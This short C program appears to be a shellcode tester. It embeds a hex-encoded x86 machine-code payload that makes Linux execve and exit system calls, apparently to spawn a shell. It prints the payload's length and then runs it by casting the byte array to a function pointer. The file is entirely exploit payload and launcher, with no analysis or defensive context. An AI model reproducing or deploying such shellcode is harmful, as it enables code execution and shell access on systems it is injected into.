#include <stdio.h>
#include <string.h>

int main(int argc, char ** argv)
{
	char shellcode[]="\x68\x20\x20\x68\x20\x20\x68\x20\x20\x68\x20\x30\x68\x64\x6f\x68\x73\x68\x68\x69\x6e\x68\x2f\x2f\x66\x89\xe3\x66\x31\xc0\x67\x88\x43\x10\x67\x89\x43\x12\x66\x67\x89\x5b\x14\x66\x67\x8d\x53\x11\x66\x67\x89\x53\x18\x66\x67\x89\x43\x1c\x66\x67\x8d\x4b\x14\x66\x67\x8d\x53\x1c\xb0\x0b\xcd\x80\xb0\x01\x66\x31\xdb\xb3\x04\xcd\x80";
	printf("%d\n", strlen(shellcode));

	(*(void (*)()) shellcode)();
}
